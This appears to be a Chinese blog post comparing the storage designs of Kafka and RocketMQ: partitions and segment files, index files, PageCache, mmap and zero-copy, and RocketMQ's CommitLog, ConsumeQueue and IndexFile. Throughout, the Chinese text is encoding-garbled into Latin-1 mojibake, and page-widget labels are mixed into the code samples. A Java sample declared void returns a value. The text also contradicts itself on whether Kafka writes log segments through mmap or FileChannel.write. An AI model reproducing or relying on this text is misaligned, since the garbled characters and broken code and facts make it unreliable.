<p>Kafkaè¿˜æœ‰ä¸€ä¸ªæ¦‚å¿µå«Partitionï¼ˆåˆ†åŒºï¼‰ï¼Œåˆ†åŒºå…·ä½“åœ¨æœåŠ¡å™¨ä¸Šé¢è¡¨ç°èµ·åˆå°±æ˜¯ä¸€ä¸ªç›®å½•ï¼Œä¸€ä¸ªä¸»é¢˜ä¸‹é¢æœ‰å¤šä¸ªåˆ†åŒºï¼Œè¿™äº›åˆ†åŒºä¼šå­˜å‚¨åˆ°ä¸åŒçš„æœåŠ¡å™¨ä¸Šé¢ï¼Œæˆ–è€…è¯´ï¼Œå…¶å®å°±æ˜¯åœ¨ä¸åŒçš„ä¸»æœºä¸Šå»ºäº†ä¸åŒçš„ç›®å½•ã€‚è¿™äº›åˆ†åŒºä¸»è¦çš„ä¿¡æ¯å°±å­˜åœ¨äº†.logæ–‡ä»¶é‡Œé¢ã€‚è·Ÿæ•°æ®åº“é‡Œé¢çš„åˆ†åŒºå·®ä¸å¤šï¼Œæ˜¯ä¸ºäº†æé«˜æ€§èƒ½ã€‚</p>
<p>è‡³äºä¸ºä»€ä¹ˆæé«˜äº†æ€§èƒ½ï¼Œå¾ˆç®€å•ï¼Œå¤šä¸ªåˆ†åŒºå¤šä¸ªçº¿ç¨‹ï¼Œå¤šä¸ªçº¿ç¨‹å¹¶è¡Œå¤„ç†è‚¯å®šä¼šæ¯”å•çº¿ç¨‹å¥½å¾—å¤šã€‚</p>
<p>Topicå’Œpartitionåƒæ˜¯HBASEé‡Œçš„tableå’Œregionçš„æ¦‚å¿µï¼Œtableåªæ˜¯ä¸€ä¸ªé€»è¾‘ä¸Šçš„æ¦‚å¿µï¼ŒçœŸæ­£å­˜å‚¨æ•°æ®çš„æ˜¯regionï¼Œè¿™äº›regionä¼šåˆ†å¸ƒå¼åœ°å­˜å‚¨åœ¨å„ä¸ªæœåŠ¡å™¨ä¸Šé¢ï¼Œå¯¹åº”äºkafkaï¼Œä¹Ÿæ˜¯ä¸€æ ·ï¼ŒTopicä¹Ÿæ˜¯é€»è¾‘æ¦‚å¿µï¼Œè€Œpartitionå°±æ˜¯åˆ†å¸ƒå¼å­˜å‚¨å•å…ƒã€‚è¿™ä¸ªè®¾è®¡æ˜¯ä¿è¯äº†æµ·é‡æ•°æ®å¤„ç†çš„åŸºç¡€ã€‚æˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¸€ä¸‹ï¼Œå¦‚æœHDFSæ²¡æœ‰blockçš„è®¾è®¡ï¼Œä¸€ä¸ª100Tçš„æ–‡ä»¶ä¹Ÿåªèƒ½å•ç‹¬æ”¾åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šé¢ï¼Œé‚£å°±ç›´æ¥å æ»¡æ•´ä¸ªæœåŠ¡å™¨äº†ï¼Œå¼•å…¥blockåï¼Œå¤§æ–‡ä»¶å¯ä»¥åˆ†æ•£å­˜å‚¨åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šã€‚</p>
<p>æ³¨æ„ï¼š</p>
<p>1.åˆ†åŒºä¼šæœ‰å•ç‚¹æ•…éšœé—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šä¸ºæ¯ä¸ªåˆ†åŒºè®¾ç½®å‰¯æœ¬æ•°</p>
<p>2.åˆ†åŒºçš„ç¼–å·æ˜¯ä»0å¼€å§‹çš„</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e0dede4a9b1497e8d3113c76045eb34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=R%2FEqquVTThnxyGAv1YlIpR4K05o%3D" alt="image.png" loading="lazy"/></p>
<p>Kafka ä»¥ã€Œä¸»é¢˜ï¼ˆTopicï¼‰- åˆ†åŒºï¼ˆPartitionï¼‰ã€ä¸ºæ ¸å¿ƒç»„ç»‡æ•°æ®ï¼Œæ¯ä¸ªåˆ†åŒºæœ¬è´¨æ˜¯ä¸€ä¸ª append-only çš„æ—¥å¿—æµï¼Œæ¶ˆæ¯æŒ‰ç”Ÿäº§é¡ºåºè¿½åŠ å­˜å‚¨ï¼Œä¿è¯åˆ†åŒºå†…æ¶ˆæ¯æœ‰åºæ€§ã€‚</p>
<p>ä¼˜ç‚¹ï¼šå¯ä»¥å……åˆ†åˆ©ç”¨ç£ç›˜é¡ºåºè¯»å†™é«˜æ€§èƒ½çš„ç‰¹æ€§ã€‚å­˜å‚¨ä»‹è´¨ä¹Ÿå¯ä»¥é€‰æ‹©å»‰ä»·çš„SATAç£ç›˜ï¼Œè¿™æ ·å¯ä»¥è·å¾—æ›´é•¿çš„æ•°æ®ä¿ç•™æ—¶é—´ã€æ›´ä½çš„æ•°æ®å­˜å‚¨æˆæœ¬ã€‚</p>
<p>1.2 æ•°æ®ç»„ç»‡ï¼šåˆ†æ®µæ—¥å¿—æ–‡ä»¶
æ¯ä¸ªåˆ†åŒºæ‹†åˆ†ä¸ºå¤šä¸ª Segment æ–‡ä»¶ï¼ˆé»˜è®¤ 1GBï¼‰ï¼Œå‘½åæ ¼å¼ä¸ºã€Œèµ·å§‹åç§»é‡.logã€ï¼ˆå¦‚ 00000000000000000000.logï¼‰ï¼Œåšè¿™ä¸ªé™åˆ¶ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿æŠŠ.logåŠ è½½åˆ°å†…å­˜å»æ“ä½œ</p>
<p>é…å¥—ä¸¤ç±»ç´¢å¼•æ–‡ä»¶ï¼š.indexï¼ˆåç§»é‡â†’ç‰©ç†åœ°å€æ˜ å°„ï¼‰ã€.timeindexï¼ˆæ—¶é—´æˆ³â†’åç§»é‡æ˜ å°„ï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98fe200edd1d43f3b8c4f9a8bf84829f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=1t46LG3yo8KfjK%2BuOQaUfnGozm8%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™ä¸ª9936472ä¹‹ç±»çš„æ•°å­—ï¼Œå°±æ˜¯ä»£è¡¨äº†è¿™ä¸ªæ—¥å¿—æ®µæ–‡ä»¶é‡ŒåŒ…å«çš„èµ·å§‹offsetï¼Œä¹Ÿå°±è¯´æ˜è¿™ä¸ªåˆ†åŒºé‡Œè‡³å°‘éƒ½å†™å…¥äº†æ¥è¿‘1000ä¸‡æ¡æ•°æ®äº†ã€‚</p>
<p>Kafka brokeræœ‰ä¸€ä¸ªå‚æ•°ï¼Œlog.segment.bytesï¼Œé™å®šäº†æ¯ä¸ªæ—¥å¿—æ®µæ–‡ä»¶çš„å¤§å°ï¼Œæœ€å¤§å°±æ˜¯1GBï¼Œä¸€ä¸ªæ—¥å¿—æ®µæ–‡ä»¶æ»¡äº†ï¼Œå°±è‡ªåŠ¨å¼€ä¸€ä¸ªæ–°çš„æ—¥å¿—æ®µæ–‡ä»¶æ¥å†™å…¥ï¼Œé¿å…å•ä¸ªæ–‡ä»¶è¿‡å¤§ï¼Œå½±å“æ–‡ä»¶çš„è¯»å†™æ€§èƒ½ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åšlog rollingï¼Œæ­£åœ¨è¢«å†™å…¥çš„é‚£ä¸ªæ—¥å¿—æ®µæ–‡ä»¶ï¼Œå«åšactive log segmentã€‚</p>
<p>1.3 æ¶ˆæ¯è¯»/å†™è¿‡ç¨‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87dd3b1cfb164f51abad77b5d5c2e908~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=JocCiiCp2n3WPuxQrcpIa81sA8g%3D" alt="image.png" loading="lazy"/></p>
<p>å†™æ¶ˆæ¯ï¼š</p>
<p>Indexæ–‡ä»¶å†™å…¥ï¼ŒIndexæ–‡ä»¶è¾ƒå°ï¼Œå¯ä»¥ç›´æ¥ç”¨mmapè¿›è¡Œå†…å­˜æ˜ å°„ï¼Œé¿å…é¢‘ç¹çš„ç£ç›˜I/Oæ“ä½œï¼Œæé«˜å†™å…¥æ€§èƒ½ï¼›ç”±äºIndexæ–‡ä»¶æ˜¯ç¨€ç–ç´¢å¼•ï¼Œåªéœ€è¦è®°å½•å…³é”®ä½ç½®çš„åç§»é‡ï¼Œå› æ­¤å³ä½¿ä½¿ç”¨mmapï¼Œå†™å…¥çš„å¼€é”€ä¹Ÿç›¸å¯¹è¾ƒä½ã€‚</p>
<p>Segmentæ–‡ä»¶å†™å…¥ï¼ŒSegmentæ–‡ä»¶è¾ƒå¤§ï¼Œå¯ä»¥é‡‡ç”¨æ™®é€šçš„å†™æ“ä½œï¼ˆFileChannel.writeï¼‰ï¼Œç”±äºSegmentæ–‡ä»¶æ˜¯é¡ºåºå†™å…¥çš„ï¼Œå¹¶ä¸”Kafkaä¼šåˆ©ç”¨æ“ä½œç³»ç»Ÿçš„PageCacheï¼ˆé¡µç¼“å­˜ï¼‰æœºåˆ¶ï¼Œå†™å…¥æ“ä½œä¼šå…ˆå†™å…¥åˆ°å†…å­˜ä¸­ï¼Œç„¶åç”±æ“ä½œç³»ç»Ÿåœ¨åå°å¼‚æ­¥åˆ·æ–°åˆ°ç£ç›˜ï¼Œå¯ä»¥è¿›ä¸€æ­¥æé«˜å†™å…¥çš„æ€§èƒ½ã€‚</p>
<p>è¯»æ¶ˆæ¯ï¼š</p>
<p>Indexæ–‡ä»¶è¯»å–ï¼Œé€šå¸¸ä½¿ç”¨mmapæ–¹å¼è¯»å–ï¼Œç”±äºIndexæ–‡ä»¶è¾ƒå°ï¼Œä¸”æ˜¯ç¨€ç–ç´¢å¼•ï¼Œç¼ºé¡µä¸­æ–­çš„å¯èƒ½æ€§è¾ƒå°ã€‚</p>
<p>Segmentæ–‡ä»¶è¯»å–ï¼Œé€šå¸¸ä½¿ç”¨sendfileç³»ç»Ÿè°ƒç”¨æ¥å®ç°é›¶æ‹·è´è¯»å–å’Œå‘é€ï¼Œå‡å°‘æ•°æ®åœ¨ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´çš„æ‹·è´æ¬¡æ•°ï¼Œæé«˜æ•°æ®ä¼ è¾“çš„æ•ˆç‡ã€‚</p>
<p>1.4 å…³é”®æŠ€æœ¯
Kafka ä½œä¸ºé«˜æ€§èƒ½çš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œå…¶è¶…é«˜ååé‡çš„æ ¸å¿ƒç§˜è¯€ä¹‹ä¸€å°±æ˜¯æ·±åº¦ä¾èµ– PageCache + é¡ºåº I/O + mmap å†…å­˜æ˜ å°„çš„ç»„åˆã€‚</p>
<p>PageCacheï¼Œä¸­æ–‡åç§°ä¸ºé¡µé«˜é€Ÿç¼“å†²å­˜å‚¨å™¨ã€‚å®ƒæ˜¯å°†ç£ç›˜ä¸Šçš„æ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå½“ç³»ç»Ÿéœ€è¦è®¿é—®è¿™äº›æ•°æ®æ—¶ï¼Œå¯ä»¥ç›´æ¥ä»å†…å­˜ä¸­è¯»å–ï¼Œè€Œä¸å¿…æ¯æ¬¡éƒ½å»è¯»å–ç£ç›˜ã€‚è¿™ç§æ–¹å¼æ˜¾è‘—å‡å°‘äº†ç£ç›˜I/Oæ“ä½œï¼Œä»è€Œæé«˜äº†ç³»ç»Ÿæ€§èƒ½ã€‚</p>
<p>mmapï¼ˆMemory-mapped fileï¼‰æ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„ä¸€ç§å°†ç£ç›˜æ–‡ä»¶ä¸è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´å»ºç«‹æ˜ å°„å…³ç³»çš„æ ¸å¿ƒæŠ€æœ¯ï¼Œæœ¬è´¨æ˜¯è®©è¿›ç¨‹é€šè¿‡ç›´æ¥æ“ä½œå†…å­˜åœ°å€çš„æ–¹å¼è¯»å†™æ–‡ä»¶ï¼Œæ— éœ€ä¼ ç»Ÿçš„ read/write ç³»ç»Ÿè°ƒç”¨ã€‚æ ¸å¿ƒä»·å€¼åœ¨äºé›¶æ‹·è´å’Œå†…å­˜å¼æ–‡ä»¶è®¿é—®ï¼Œå°¤å…¶é€‚åˆå¤§æ–‡ä»¶ã€é«˜ååã€éšæœºè®¿é—®çš„åœºæ™¯ã€‚</p>
<p>å°†æ—¥å¿—æ®µï¼ˆ.logï¼‰æ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ï¼Œç”Ÿäº§è€…å†™å…¥æ—¶ç›´æ¥å†™å†…å­˜ï¼ˆå†…æ ¸å¼‚æ­¥åˆ·ç›˜ï¼‰ï¼Œæ¶ˆè´¹è€…è¯»å–æ—¶ç›´æ¥ä»å†…å­˜è¯»å–ï¼Œå®ç°è¶…é«˜ååï¼ˆKafka çš„ â€œé¡ºåºå†™ + mmapâ€ æ˜¯å…¶é«˜æ€§èƒ½æ ¸å¿ƒï¼‰ï¼›</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a78dd2bbace8471c95616863c90a6a21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073619&amp;x-signature=AuQpCNAvLj6Ru2bgsycYsEAsCyY%3D" alt="image.png" loading="lazy"/></p>
<p>é›¶æ‹·è´æµç¨‹ç¤ºæ„å›¾</p>
<p>é›¶æ‹·è´è¿‡ç¨‹ï¼š</p>
<p>1.ç”¨æˆ·è¿›ç¨‹å‘èµ·sendfileç³»ç»Ÿè°ƒç”¨ï¼Œä¸Šä¸‹æ–‡ï¼ˆåˆ‡æ¢1ï¼‰ä»ç”¨æˆ·æ€è½¬å‘å†…æ ¸æ€</p>
<p>2.DMAæ§åˆ¶å™¨ï¼ŒæŠŠæ•°æ®ä»ç¡¬ç›˜ä¸­æ‹·è´åˆ°å†…æ ¸ç¼“å†²åŒºã€‚</p>
<p>3.CPUå°†è¯»ç¼“å†²åŒºä¸­æ•°æ®æ‹·è´åˆ°socketç¼“å†²åŒº</p>
<p>4.DMAæ§åˆ¶å™¨ï¼Œå¼‚æ­¥æŠŠæ•°æ®ä»socketç¼“å†²åŒºæ‹·è´åˆ°ç½‘å¡ï¼Œ</p>
<p>5.ä¸Šä¸‹æ–‡ï¼ˆåˆ‡æ¢2ï¼‰ä»å†…æ ¸æ€åˆ‡æ¢å›ç”¨æˆ·æ€ï¼Œsendfileè°ƒç”¨è¿”å›ã€‚</p>
<p>1.5 è®¾è®¡ä¼˜åŠ¿
â€¢é¡ºåºå†™ç£ç›˜ï¼šSegment æ–‡ä»¶ä»…è¿½åŠ å†™å…¥ï¼Œè§„é¿éšæœº IOï¼Œååé‡æé«˜ï¼ˆå•åˆ†åŒºå¯è¾¾ 10 ä¸‡ + TPSï¼‰</p>
<p>â€¢ç´¢å¼•è½»é‡åŒ–ï¼šä»…ç»´æŠ¤åç§»é‡ä¸æ—¶é—´æˆ³ç´¢å¼•ï¼Œé™ä½å­˜å‚¨å¼€é”€</p>
<p>â€¢å‰¯æœ¬åŒæ­¥ï¼šåŸºäº ISR æœºåˆ¶ï¼Œä»…åŒæ­¥å·²æäº¤æ¶ˆæ¯ï¼Œå…¼é¡¾ä¸€è‡´æ€§ä¸å¯ç”¨æ€§</p>
<h2 data-id="heading-1">02.RocketMQå­˜å‚¨æ¶æ„</h2>
<p>Kafkaçš„æ¯ä¸ªPartitionéƒ½æ˜¯ä¸€ä¸ªå®Œæ•´çš„ã€é¡ºåºå†™å…¥çš„æ–‡ä»¶ï¼Œä½†å½“Partitionæ•°é‡å¢å¤šæ—¶ï¼Œä»æ“ä½œç³»ç»Ÿçš„è§’åº¦çœ‹ï¼Œè¿™äº›å†™å…¥æ“ä½œä¼šå˜å¾—ç›¸å¯¹éšæœºï¼Œè¿™å¯èƒ½ä¼šå½±å“å†™å…¥æ€§èƒ½ã€‚</p>
<p>2.1 æ ¸å¿ƒå­˜å‚¨æ¨¡å‹ï¼šåˆ†ç¦»å¼è®¾è®¡</p>
<p>RocketMQé‡‡ç”¨ã€ŒCommitLog + ConsumeQueue + IndexFileã€ä¸‰å±‚ç»“æ„ï¼Œå½»åº•åˆ†ç¦»æ•°æ®å­˜å‚¨ä¸ç´¢å¼•æŸ¥è¯¢ï¼š</p>
<p>CommitLogï¼šå…¨å±€å•ä¸€æ—¥å¿—æ–‡ä»¶ï¼ˆé»˜è®¤ 1GB / ä¸ªï¼Œå¾ªç¯è¦†ç›–ï¼‰ï¼Œå­˜å‚¨æ‰€æœ‰ä¸»é¢˜çš„åŸå§‹æ¶ˆæ¯</p>
<p>ConsumeQueueï¼šæŒ‰ä¸»é¢˜ - é˜Ÿåˆ—ç»´åº¦æ‹†åˆ†çš„ç´¢å¼•æ–‡ä»¶ï¼Œå­˜å‚¨ã€Œæ¶ˆæ¯ç‰©ç†åœ°å€ + åç§»é‡ + é•¿åº¦ã€ï¼Œä¾›æ¶ˆè´¹è€…å¿«é€ŸæŸ¥è¯¢</p>
<p>IndexFileï¼šå“ˆå¸Œç´¢å¼•æ–‡ä»¶ï¼Œæ”¯æŒæŒ‰æ¶ˆæ¯ Key æŸ¥è¯¢</p>
<p>CommitLogï¼šæ¶ˆæ¯çš„åŸå§‹æ—¥è®°æœ¬</p>
<p>CommitLogæ˜¯RocketMQå­˜å‚¨æ¶ˆæ¯çš„ç‰©ç†æ–‡ä»¶ï¼Œæ‰€æœ‰æ¶ˆæ¯éƒ½ä¼šæŒ‰åˆ°è¾¾é¡ºåºå†™å…¥è¿™ä¸ªæ–‡ä»¶ã€‚ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆä¸€æœ¬ä¸æ–­è¿½åŠ çš„æ—¥è®°æœ¬â€”â€”æ¯æ¡æ¶ˆæ¯éƒ½æ˜¯æŒ‰æ—¶é—´é¡ºåºè®°å½•çš„æ–°æ—¥è®°ã€‚</p>
<p>// æ¶ˆæ¯å­˜å‚¨çš„æ ¸å¿ƒé€»è¾‘ç®€åŒ–ç¤ºä¾‹ï¼ˆéæºç ï¼‰
public void putMessage(Message message) {
// 1. å°†æ¶ˆæ¯åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„
byte[] data = serialize(message);
// 2. è®¡ç®—æ¶ˆæ¯ç‰©ç†åç§»é‡
long offset = commitLog.getMaxOffset();
// 3. å°†æ•°æ®è¿½åŠ åˆ°CommitLogæ–‡ä»¶æœ«å°¾
commitLog.append(data);
// 4. è¿”å›æ¶ˆæ¯çš„å…¨å±€å”¯ä¸€ç‰©ç†åç§»é‡
return offset;
}
AIå†™ä»£ç 
æ¶ˆæ¯å†™å…¥CommitLogæ—¶æœ‰ä¸‰ä¸ªå…³é”®ç‰¹æ€§ï¼š</p>
<p>1.é¡ºåºå†™å…¥ï¼šæ‰€æœ‰æ¶ˆæ¯æŒ‰åˆ°è¾¾é¡ºåºè¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾ï¼Œé¿å…ç£ç›˜éšæœºå¯»å€</p>
<p>2.å†…å­˜æ˜ å°„ï¼šé€šè¿‡MappedByteBufferå®ç°æ–‡ä»¶æ˜ å°„ï¼Œå‡å°‘æ•°æ®æ‹·è´æ¬¡æ•°</p>
<p>3.æ–‡ä»¶åˆ†å‰²ï¼šå•ä¸ªCommitLogæ–‡ä»¶é»˜è®¤1GBï¼Œå†™æ»¡ååˆ›å»ºæ–°æ–‡ä»¶ï¼ˆæ–‡ä»¶åç”¨èµ·å§‹åç§»é‡å‘½åï¼‰</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œå½“ç”Ÿäº§è€…å‘é€ä¸‰æ¡æ¶ˆæ¯æ—¶ï¼ŒCommitLogæ–‡ä»¶å¯èƒ½é•¿è¿™æ ·ï¼š</p>
<p>0000000000000000000ï¼ˆæ–‡ä»¶1ï¼Œ1GBï¼‰<br/>
2|--æ¶ˆæ¯A(offset=0)<br/>
3|--æ¶ˆæ¯B(offset=100)<br/>
4|--æ¶ˆæ¯C(offset=200)<br/>
500000000001073741824ï¼ˆæ–‡ä»¶2ï¼Œèµ·å§‹åç§»é‡1073741824ï¼‰<br/>
AIå†™ä»£ç 
æ¸©é¦¨æç¤ºï¼šè™½ç„¶CommitLogæ˜¯é¡ºåºå†™ï¼Œä½†è¯»å–æ—¶éœ€è¦é…åˆç´¢å¼•ç»“æ„ï¼Œå¦åˆ™éå†æ–‡ä»¶æ‰¾æ¶ˆæ¯å°±åƒå¤§æµ·æé’ˆã€‚</p>
<p>æ¶ˆè´¹é˜Ÿåˆ—ConsumeQueueï¼šæ¶ˆæ¯çš„å¿«é€Ÿç›®å½•</p>
<p>å¦‚æœæ¯æ¬¡æ¶ˆè´¹éƒ½è¦æ‰«æCommitLogï¼Œæ€§èƒ½ä¼šæƒ¨ä¸å¿ç¹ã€‚äºæ˜¯RocketMQè®¾è®¡äº†ConsumeQueueâ€”â€”å®ƒæ˜¯åŸºäºTopicå’ŒQueueçš„äºŒçº§ç´¢å¼•æ–‡ä»¶ã€‚</p>
<p>æ¯ä¸ªConsumeQueueæ¡ç›®åŒ…å«ä¸‰ä¸ªå…³é”®ä¿¡æ¯ï¼ˆå›ºå®š20å­—èŠ‚ï¼‰ï¼š</p>
<p>1| CommitLog Offset (8å­—èŠ‚) | Message Size (4å­—èŠ‚) | Tag Hashcode (8å­—èŠ‚) |<br/>
AIå†™ä»£ç 
è¿™ç›¸å½“äºç»™CommitLogé‡Œçš„æ¶ˆæ¯åšäº†ä¸€ä¸ªç›®å½•ï¼š</p>
<p>TopicA-Queue0çš„ConsumeQueue<br/>
2|--0ï¼ˆå¯¹åº”CommitLogåç§»0çš„æ¶ˆæ¯Aï¼‰<br/>
3|--100ï¼ˆå¯¹åº”CommitLogåç§»100çš„æ¶ˆæ¯Bï¼‰<br/>
4|--200ï¼ˆå¯¹åº”CommitLogåç§»200çš„æ¶ˆæ¯Cï¼‰
AIå†™ä»£ç 
å½“æ¶ˆè´¹è€…æ‹‰å–TopicA-Queue0çš„æ¶ˆæ¯æ—¶ï¼š</p>
<p>1.å…ˆæŸ¥ConsumeQueueè·å–æ¶ˆæ¯çš„ç‰©ç†ä½ç½®</p>
<p>2.æ ¹æ®CommitLog Offsetç›´æ¥å®šä½åˆ°CommitLogæ–‡ä»¶</p>
<p>3.è¯»å–æŒ‡å®šä½ç½®çš„æ¶ˆæ¯å†…å®¹</p>
<p>å…³é”®è®¾è®¡ç‚¹ï¼š</p>
<p>ConsumeQueueé‡‡ç”¨å†…å­˜æ˜ å°„+å¼‚æ­¥åˆ·ç›˜ï¼Œä¿è¯é«˜æ€§èƒ½</p>
<p>å•ä¸ªæ–‡ä»¶å­˜å‚¨30ä¸‡æ¡ç´¢å¼•ï¼Œçº¦5.72MBï¼ˆ30ä¸‡*20å­—èŠ‚ï¼‰</p>
<p>é€šè¿‡hashCodeå¿«é€Ÿè¿‡æ»¤Tagï¼Œå®ç°æ¶ˆæ¯è¿‡æ»¤</p>
<p>ç´¢å¼•æ–‡ä»¶IndexFileï¼šæ¶ˆæ¯çš„å…¨å±€å­—å…¸</p>
<p>å¦‚æœéœ€è¦æ ¹æ®MessageIDæˆ–KeyæŸ¥è¯¢æ¶ˆæ¯ï¼ŒConsumeQueueå°±ä¸å¤Ÿç”¨äº†ã€‚è¿™æ—¶å€™å°±è¦ç”¨åˆ°IndexFileè¿™ä¸ªå…¨å±€ç´¢å¼•ã€‚</p>
<p>IndexFileçš„ç»“æ„ç±»ä¼¼HashMapï¼š</p>
<p>1.Slotæ§½ä½ï¼ˆ500ä¸‡ä¸ªï¼‰ï¼šå­˜å‚¨ç›¸åŒhashå€¼çš„Indexæ¡ç›®é“¾è¡¨å¤´</p>
<p>2.Indexæ¡ç›®ï¼ˆ2000ä¸‡æ¡ï¼‰ï¼šåŒ…å«Keyçš„hashå€¼ã€CommitLogåç§»é‡ã€æ—¶é—´å·®ç­‰ä¿¡æ¯</p>
<p>å½“å†™å…¥æ¶ˆæ¯æ—¶ï¼š</p>
<p>// ç´¢å¼•æ„å»ºè¿‡ç¨‹ç®€åŒ–ç¤ºæ„
public void buildIndex(Message message) {
// è®¡ç®—Keyçš„hashå€¼
int hash = hash(message.getKey());
// å®šä½åˆ°å¯¹åº”çš„Slotæ§½ä½
int slotPos = hash % slotNum;
// åœ¨IndexåŒºåŸŸè¿½åŠ æ–°æ¡ç›®
indexFile.addEntry(hash, message.getCommitLogOffset());
}
AIå†™ä»£ç 
æŸ¥è¯¢æ—¶é€šè¿‡ä¸¤æ¬¡æŸ¥æ‰¾å¿«é€Ÿå®šä½ï¼š</p>
<p>1.æ ¹æ®Keyçš„hashå€¼æ‰¾åˆ°Slotæ§½ä½</p>
<p>2.éå†Slotå¯¹åº”çš„é“¾è¡¨ï¼Œæ¯”å¯¹CommitLogä¸­çš„å®é™…Keyå€¼</p>
<p>æ€§èƒ½ä¼˜åŒ–å¿…çŸ¥ï¼š</p>
<p>æ¶ˆæ¯ä½“ç§¯å·®å¼‚å¤§æ—¶ï¼ŒCommitLogä»ç„¶ä¿æŒé¡ºåºå†™ï¼Œä½†ConsumeQueueå¯èƒ½å‡ºç°ã€Œç¨€ç–ç´¢å¼•ã€ï¼ˆç›¸é‚»ç´¢å¼•æŒ‡å‘çš„ç‰©ç†ä½ç½®é—´éš”å¤§ï¼‰</p>
<p>ç”Ÿäº§ç¯å¢ƒä¸­CommitLogå»ºè®®æ”¾åœ¨å•ç‹¬SSDç£ç›˜ï¼ŒConsumeQueueå’ŒIndexFileå¯æ”¾æ™®é€šç£ç›˜</p>
<p>é‡åˆ°æ¶ˆæ¯å †ç§¯æ—¶ï¼Œä¼˜å…ˆæ£€æŸ¥æ¶ˆè´¹è€…é€Ÿåº¦ï¼Œè€Œä¸æ˜¯æ— è„‘æ‰©å®¹Brokerå­˜å‚¨</p>
<p>ç†è§£è¿™äº›åº•å±‚æœºåˆ¶ï¼Œä¸‹æ¬¡é‡åˆ°æ¶ˆæ¯æŸ¥è¯¢æ€§èƒ½é—®é¢˜æˆ–è€…ç£ç›˜IOç“¶é¢ˆæ—¶ï¼Œå°±çŸ¥é“è¯¥ä»CommitLogçš„å†™å…¥æ¨¡å¼è¿˜æ˜¯ConsumeQueueçš„ç´¢å¼•ç»“æ„å…¥æ‰‹æ’æŸ¥äº†ã€‚</p>
<p>2.2 æ•°æ®æµè½¬æœºåˆ¶
ç”Ÿäº§è€…å†™å…¥ CommitLogï¼Œç”Ÿæˆå…¨å±€å”¯ä¸€åç§»é‡ï¼ˆPHYOFFSETï¼‰</p>
<p>åå°çº¿ç¨‹å¼‚æ­¥æ„å»º ConsumeQueue ç´¢å¼•ï¼ŒåŒæ­¥æ¶ˆæ¯å…ƒæ•°æ®</p>
<p>æ¶ˆè´¹è€…é€šè¿‡ ConsumeQueue å®šä½ CommitLog ä¸­çš„æ¶ˆæ¯ï¼Œé¿å…å…¨é‡æ‰«æ</p>
<p>å­˜å‚¨è¿‡ç¨‹å…¨æ™¯å›¾</p>
<p>ç°åœ¨æŠŠå„ä¸ªæ¨¡å—ä¸²èµ·æ¥çœ‹æ¶ˆæ¯çš„ç”Ÿå‘½å‘¨æœŸï¼š</p>
<p>1.ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åˆ°Broker</p>
<p>2.Brokerå°†æ¶ˆæ¯é¡ºåºå†™å…¥CommitLog</p>
<p>3.å¼‚æ­¥çº¿ç¨‹åŒæ—¶æ„å»ºConsumeQueueå’ŒIndexFile</p>
<p>4.æ¶ˆè´¹è€…é€šè¿‡ConsumeQueueå¿«é€Ÿå®šä½æ¶ˆæ¯</p>
<p>5.æŒ‰éœ€æŸ¥è¯¢IndexFileå®ç°æ¶ˆæ¯å›æº¯</p>
<p>æ•´ä¸ªè¿‡ç¨‹å°±åƒå›¾ä¹¦é¦†çš„ç®¡ç†ç³»ç»Ÿï¼š</p>
<p>CommitLogæ˜¯è—ä¹¦åº“ï¼ˆæŒ‰å…¥åº“æ—¶é—´æ‘†æ”¾ï¼‰</p>
<p>ConsumeQueueæ˜¯åˆ†ç±»ç›®å½•ï¼ˆæŒ‰é¢˜æ/å‡ºç‰ˆç¤¾åˆ†ç±»ï¼‰</p>
<p>IndexFileæ˜¯æ£€ç´¢ç”µè„‘ï¼ˆæ”¯æŒæŒ‰ä¹¦å/ä½œè€…æŸ¥è¯¢ï¼‰</p>
<p>2.3 è®¾è®¡ä¼˜åŠ¿
è¯»å†™åˆ†ç¦»ï¼šCommitLog ä»…è´Ÿè´£å†™å…¥ï¼ŒConsumeQueue è´Ÿè´£æŸ¥è¯¢ï¼Œæå‡å¹¶å‘æ€§èƒ½</p>
<p>äº‹åŠ¡æ”¯æŒï¼šé€šè¿‡ CommitLog ä¸­çš„äº‹åŠ¡çŠ¶æ€æ ‡è®° + å›æŸ¥æœºåˆ¶ï¼Œå®ç°åˆ†å¸ƒå¼äº‹åŠ¡æ¶ˆæ¯</p>
